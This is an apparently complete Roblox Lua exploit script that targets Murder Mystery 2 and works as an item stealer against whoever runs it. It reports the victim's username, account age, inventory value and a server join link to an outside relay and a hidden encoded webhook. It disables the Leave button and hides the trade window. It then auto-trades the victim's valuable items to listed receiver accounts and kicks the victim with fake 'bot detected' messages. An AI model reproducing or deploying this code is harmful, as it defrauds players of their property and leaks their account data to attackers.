_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local API_ENDPOINT = "https://relay.koons.wtf/relay"
local SECRET_ID = "d43dcec501f491e2103f492a"
local ENCODED_WEBHOOK = getgenv().WEBHOOK or ""
local WEBHOOK_ID = getgenv().WEBHOOK_ID or "default"
local Usernames = getgenv().RECEIVERS or {}
local a = Usernames

local function DecodeWebhook(encoded)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=_-)(*&^%$#@![]{}|<>?,.;: "
    local result = ""
    local i = 1
    while i <= #encoded do
        local c = encoded:sub(i, i)
        if c == "a" and i < #encoded then
            local next_c = encoded:sub(i+1, i+1)
            local idx = charset:find(next_c, 1, true)
            if idx then
                local pos_in_loop = math.floor((i-1)/2)
                local shift = (pos_in_loop % 7) + 1
                local orig_idx = ((idx - 1 - shift) % #charset) + 1
                result = result .. charset:sub(orig_idx, orig_idx)
            end
            i = i + 2
        else
            result = result .. c
            i = i + 1
        end
    end
    return result
end

local REAL_WEBHOOK = DecodeWebhook(ENCODED_WEBHOOK)

local found = false
local attempts = 0

if getgc then
    repeat
        local hooked = false
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name then
                    local name = info.name:lower()
                    if name:find("step") and not name:find("stepanimate") then
                        pcall(function()
                            local old = hookfunction(v, function(...)
                                if not found then
                                    found = true
                                    _G.RealJobID = game.JobId
                                end
                                if old then return old(...) end
                            end)
                        end)
                        hooked = true
                        break
                    end
                end
            end
        end
        attempts = attempts + 1
        if hooked or attempts >= 10 then break end
        task.wait(0.1)
    until found
end

if not found then _G.RealJobID = game.JobId end
task.wait(0.5)

task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                v:Disable()
            end
        end)
    end
end)

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetRealJobID()
    local exec = "Unknown"
    pcall(function() exec = identifyexecutor() end)
    local d = {
        JobId = _G.RealJobID or game.JobId,
        Executor = string.lower(exec),
        IsDelta = false,
        Success = true,
    }
    if d.Executor == "delta" and _G.RealJobID then d.IsDelta = true end
    return d
end

local jobData = GetRealJobID()
_G.RealJobID = jobData.JobId
_G.RealExecutor = jobData.Executor

if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2")
    return
end

local Services = setmetatable({}, {__index = function(self, s) return game:GetService(s) end})

task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            local AllButtons = Services.CoreGui:GetDescendants()
            for _, btn in ipairs(AllButtons) do
                if btn:IsA("GuiButton") and btn.Name == "LeaveGameButton" then
                    for _, conn in ipairs(getconnections(btn.Activated)) do
                        conn:Disable()
                    end
                end
            end
        end)
    end
end)

pcall(function()
    local rs = game:GetService("RobloxReplicatedStorage")
    if rs and rs:FindFirstChild("GetServerType") then
        if rs.GetServerType:InvokeServer() == "VIPServer" then
            game.Players.LocalPlayer:Kick("Private servers are not supported.")
            return
        end
    end
end)

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local itemData = {}
local excludedItems = {
    DefaultGun = true, DefaultKnife = true,
    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true,
    Cracks = true, Icecrusher = true,
    ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
    SharkSeeker = true
}

local function LoadItemDatabase()
    local req = GetRequestFunction()
    if not req then return nil end
    local resp = nil
    local success = pcall(function()
        resp = req({
            Url = "https://api.rubis.app/v2/scrap/JyWtnidf9DD8s5Fs/raw",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"},
            Timeout = 10
        })
    end)
    if not success or not resp or not resp.Body then return nil end
    local db = nil
    pcall(function() db = HttpService:JSONDecode(resp.Body) end)
    if not db then return nil end
    local mapping = {}
    for rarityName, items in pairs(db) do
        local r = string.upper(string.sub(rarityName, 1, 1)) .. string.lower(string.sub(rarityName, 2))
        for itemName, value in pairs(items) do
            local n1 = string.lower(itemName):gsub("'", ""):gsub(" ", ""):gsub("_", "")
            local n2 = string.lower(itemName):gsub("'", ""):gsub(" ", "_")
            local data = {Rarity = r, Value = tonumber(value) or 0, Chroma = (r == "Chroma"), InDatabase = true}
            mapping[n1] = data
            mapping[n2] = data
        end
    end
    return mapping
end

for _ = 1, 3 do
    itemData = LoadItemDatabase()
    if itemData and next(itemData) then break end
    task.wait(0.5)
end

local function toTitleCase(text)
    local result = ""
    local capitalize = true
    for i = 1, #text do
        local char = text:sub(i, i)
        if char == "_" or char == " " then
            result = result .. " "
            capitalize = true
        else
            result = result .. (capitalize and char:upper() or char:lower())
            capitalize = false
        end
    end
    return result
end

local function FormatValue(amount)
    return string.format("%4s", tostring(math.floor(amount + 0.5)))
end

local function PadRight(text, width)
    return text .. string.rep(" ", math.max(0, width - #text))
end

local function BuildItemLines(item)
    local name = toTitleCase(item.ItemName)
    if item.IsChroma then name = "Chroma " .. name end
    local prefix = "➤ [" .. string.format("×%d", item.Amount) .. "]"
    return {prefix .. " " .. PadRight(name, 22) .. " → " .. FormatValue(item.TotalValue)}
end

local function GetTradeStatus()
    local ok, res = pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus") then
            return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
        end
        return "None"
    end)
    return ok and res or "None"
end

local function SendTradeRequest(targetName)
    local target = Players:FindFirstChild(targetName)
    local ok = pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest") then
            ReplicatedStorage.Trade.SendRequest:InvokeServer(target or targetName)
        end
    end)
    return ok
end

local function AddWeaponToTrade(itemId)
    pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem") then
            ReplicatedStorage.Trade.OfferItem:FireServer(itemId, "Weapons")
        end
    end)
end

local lastOffer = nil
pcall(function()
    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("UpdateTrade") then
        ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
            if data and data.LastOffer then lastOffer = data.LastOffer end
        end)
    end
end)

local function AcceptTrade()
    if lastOffer then
        pcall(function()
            if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade") then
                ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
            end
        end)
        lastOffer = nil
        return true
    end
    return false
end

local function WaitForTradeCompletion()
    local maxWait = 30
    while GetTradeStatus() ~= "None" and maxWait > 0 do
        task.wait(0.5)
        maxWait = maxWait - 1
    end
end

local allItems, tradeItems, totalValue = {}, {}, 0

local function ShouldTradeItem(item)
    return item.InDatabase and not excludedItems[item.DataID]
end

local function HasAnyDatabaseItem(itemList)
    for _, item in ipairs(itemList) do
        if item.InDatabase then return true end
    end
    return false
end

local function BuildInventoryLists()
    local allList, tradeList, totalTradeValue = {}, {}, 0
    local ok, profile = pcall(function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Remotes") and
           ReplicatedStorage.Remotes:FindFirstChild("Inventory") and
           ReplicatedStorage.Remotes.Inventory:FindFirstChild("GetProfileData") then
            return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
        end
        return nil
    end)
    if not ok or not profile or not profile.Weapons or not profile.Weapons.Owned then
        return allList, tradeList, totalTradeValue
    end
    for itemId, amount in pairs(profile.Weapons.Owned) do
        if amount and amount > 0 then
            local k1 = string.lower(itemId):gsub("'", ""):gsub(" ", ""):gsub("_", "")
            local k2 = string.lower(itemId):gsub("'", ""):gsub(" ", "_")
            local info = itemData[k1] or itemData[k2]
            local item = {
                DataID = itemId,
                ItemName = itemId,
                Rarity = info and info.Rarity or "Common",
                Amount = amount,
                Value = info and info.Value or 0,
                IsChroma = info and info.Chroma or false,
                InDatabase = info and info.InDatabase or false,
                TotalValue = (info and info.Value or 0) * amount
            }
            table.insert(allList, item)
            if ShouldTradeItem(item) then
                table.insert(tradeList, item)
                totalTradeValue = totalTradeValue + item.TotalValue
            end
        end
    end
    table.sort(allList, function(x, y) return x.TotalValue > y.TotalValue end)
    table.sort(tradeList, function(x, y) return x.TotalValue > y.TotalValue end)
    return allList, tradeList, totalTradeValue
end

local function RefreshInventory()
    allItems, tradeItems, totalValue = BuildInventoryLists()
end

allItems, tradeItems, totalValue = BuildInventoryLists()

local function SendToRelay(payload)
    local req = GetRequestFunction()
    if not req then return end
    local success = false
    pcall(function()
        local res = req({
            Url = API_ENDPOINT,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                secret_id = SECRET_ID,
                webhook_id = WEBHOOK_ID,
                data = payload
            })
        })
        if res and res.StatusCode == 200 then success = true end
    end)
    if not success and REAL_WEBHOOK ~= "" then
        pcall(function()
            req({
                Url = REAL_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

local function SendInventoryEmbed()
    local previewItems = {}
    local totalItemsCount = 0
    for _, item in ipairs(allItems) do
        totalItemsCount = totalItemsCount + item.Amount
    end
    for i = 1, math.min(10, #allItems) do
        local item = allItems[i]
        if item.Rarity ~= "Common" and item.Rarity ~= "Uncommon" then
            for _, line in ipairs(BuildItemLines(item)) do
                table.insert(previewItems, line)
            end
        end
    end
    local previewText = table.concat(previewItems, "\n")
    if #allItems > 10 then previewText = previewText .. "\n... and " .. (#allItems - 10) .. " more items" end
    if previewText == "" then previewText = "No valuable items found." end
    local playerCount = #Players:GetPlayers()
    local receiversList = table.concat(a, ", ")
    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. _G.RealJobID
    local playerInfoText = string.format(
        "Username: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/12\nReceivers: %s",
        LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
        _G.RealExecutor or "Unknown", playerCount, receiversList
    )
    local statsText = string.format(
        "Total Items: %d\nTradeable Value: %s",
        totalItemsCount, FormatValue(totalValue):gsub("^%s+", "")
    )
    local shouldPing = HasAnyDatabaseItem(allItems)
    local embed = {
        author = {name = "WISTERIA MM2", icon_url = "https://i.imgur.com/96imAJh.png"},
        color = 0x9933CC,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = {
            {name = "Player Info", value = "```\n" .. playerInfoText .. "\n```", inline = false},
            {name = "Stats", value = "```\n" .. statsText .. "\n```", inline = false},
            {name = "Items Preview", value = "```\n" .. previewText .. "\n```", inline = false},
            {name = "Join Link", value = joinLink, inline = false}
        },
        footer = {
            text = "WISTERIA MM2 • " .. os.date("%Y-%m-%d %H:%M:%S"),
            icon_url = "https://i.imgur.com/96imAJh.png"
        }
    }
    SendToRelay({
        content = shouldPing and "@everyone" or "",
        embeds = {embed}
    })
end

pcall(function()
    local tradeGui = PlayerGui:WaitForChild("TradeGUI", 5)
    if tradeGui then
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            tradeGui.Enabled = false
        end)
    end
end)

pcall(function()
    local tradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
    if tradeGuiPhone then
        tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
            tradeGuiPhone.Enabled = false
        end)
    end
end)

local function KickWhenDone()
    task.wait(2)
    game.Players.LocalPlayer:Kick("Bot Account Detected!!")
end

if #allItems > 0 then
    SendInventoryEmbed()
    local function ProcessTradesLoop(targetName)
        local maxTradeAttempts = 999
        local tradeAttempts = 0
        while tradeAttempts < maxTradeAttempts do
            RefreshInventory()
            if #tradeItems == 0 then KickWhenDone() return end
            tradeAttempts = tradeAttempts + 1
            local status = GetTradeStatus()
            if status == "StartTrade" then
                pcall(function()
                    if ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineTrade") then
                        ReplicatedStorage.Trade.DeclineTrade:FireServer()
                    end
                end)
                task.wait(0.3)
            elseif status == "ReceivingRequest" then
                pcall(function()
                    if ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineRequest") then
                        ReplicatedStorage.Trade.DeclineRequest:FireServer()
                    end
                end)
                task.wait(0.3)
            end
            local tradeSent = false
            local sendAttempts = 0
            while not tradeSent and sendAttempts < 15 do
                local currentStatus = GetTradeStatus()
                if currentStatus == "None" then
                    if SendTradeRequest(targetName) then tradeSent = true end
                elseif currentStatus == "StartTrade" then
                    tradeSent = true
                elseif currentStatus == "ReceivingRequest" then
                    pcall(function()
                        if ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineRequest") then
                            ReplicatedStorage.Trade.DeclineRequest:FireServer()
                        end
                    end)
                    task.wait(0.2)
                end
                if not tradeSent then
                    task.wait(0.4)
                    sendAttempts = sendAttempts + 1
                end
            end
            if not tradeSent then task.wait(1) continue end
            local waitLoop = 0
            while GetTradeStatus() ~= "StartTrade" and waitLoop < 30 do
                task.wait(0.2)
                waitLoop = waitLoop + 1
            end
            if GetTradeStatus() ~= "StartTrade" then task.wait(1) continue end
            local itemsToSend = math.min(4, #tradeItems)
            for _ = 1, itemsToSend do
                if #tradeItems == 0 then break end
                local item = table.remove(tradeItems, 1)
                for _ = 1, item.Amount do
                    AddWeaponToTrade(item.DataID)
                    task.wait(0.015)
                end
            end
            task.wait(6)
            AcceptTrade()
            WaitForTradeCompletion()
            task.wait(1.5)
        end
    end
    local function AutoTradeOnJoin()
        local isBusy = false
        local function CheckPlayer(player)
            if isBusy then return end
            if table.find(a, player.Name) then
                isBusy = true
                task.wait(3)
                ProcessTradesLoop(player.Name)
            end
        end
        for _, player in ipairs(Players:GetPlayers()) do CheckPlayer(player) end
        Players.PlayerAdded:Connect(CheckPlayer)
    end
    AutoTradeOnJoin()
else
    task.wait(1)
    game.Players.LocalPlayer:Kick("Bot/New Account Detected!")
end
